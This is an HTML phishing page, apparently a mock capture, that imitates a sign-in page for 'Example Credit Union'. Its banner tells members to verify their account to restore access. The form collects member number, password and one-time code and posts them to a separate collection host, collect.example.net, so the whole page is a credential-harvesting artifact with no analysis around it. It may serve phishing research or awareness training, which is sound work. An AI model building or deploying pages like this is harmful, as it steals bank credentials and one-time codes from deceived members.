<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Sign in - Example Credit Union</title>
</head>
<body>
  <!-- cdn node: 198.51.100.23 (documentation range, mock capture) -->
  <main class="login-card">
    <h1>Example Credit Union</h1>
    <p class="subtitle">Members: verify your account to restore access.</p>

    <form id="signin" action="https://collect.example.net/post" method="POST">
      <label for="member">Member number</label>
      <input id="member" name="member_id" type="text" required>

      <label for="password">Password</label>
      <input id="password" name="password" type="password" required>

      <label for="otp">One-time code</label>
      <input id="otp" name="otp" type="text" inputmode="numeric">

      <button type="submit">Restore access</button>
    </form>

    <p class="fine-print">
      Support: helpdesk@example.com - reference case 2026-11-014.
    </p>
  </main>
</body>
</html>
